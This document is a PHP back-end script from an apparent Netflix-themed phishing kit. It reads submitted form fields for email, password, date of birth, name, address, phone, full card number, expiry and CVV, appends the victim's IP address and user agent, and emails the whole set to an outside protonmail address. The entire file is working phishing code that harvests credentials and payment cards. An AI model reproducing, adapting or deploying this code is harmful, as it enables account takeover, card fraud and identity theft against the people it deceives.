<meta charset="utf-8">
<?php require_once ('geoplugin.class.php');
$IIIIIIIIIIII = new geoPlugin();
$IIIIIIIIIIII->locate();

if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
$ip = getenv('REMOTE_ADDR');
$agent=$_SERVER['HTTP_USER_AGENT'];

$email_to =   'saspam30@protonmail.com';
  
    $email    =   $_POST['email'];
    $password    =   $_POST['password'];
    $dob    =   $_POST['dob'];
    $f_name    =   $_POST['f_name'];
    $l_name    =   $_POST['l_name'];
    $card    =   $_POST['card'];
    $date    =   $_POST['date'];
    $cvv    =   $_POST['cvv'];
    $address    =   $_POST['address'];
    $postal    =   $_POST['postal'];
    $city    =   $_POST['city'];
    $province   =   $_POST['province'];
	$phone    =   $_POST['phone'];
    $name_card    =   $_POST['namecard'];

    $subject  =  'Netflix $';
 
$message  = "Email: $email
            \nPassword: $password
            \nFirst Name: $f_name
            \nLast Name: $l_name
            \nDate of Birth: $dob
            \nAddress: $address
            \nCity: $city
            \nProvince: $province
			\nPostal: $postal
            \nPhone: $phone
            \nCard Number: $card
            \nName on Card: $name_card
            \nDate: $date
            \nCVV: $cvv
            \n----------------
            \nIp: $ip
            \nUser agent: $agent";

 
 mail($email_to, $subject, $message, "Content-type: text/plain; charset=utf-8");
       
?>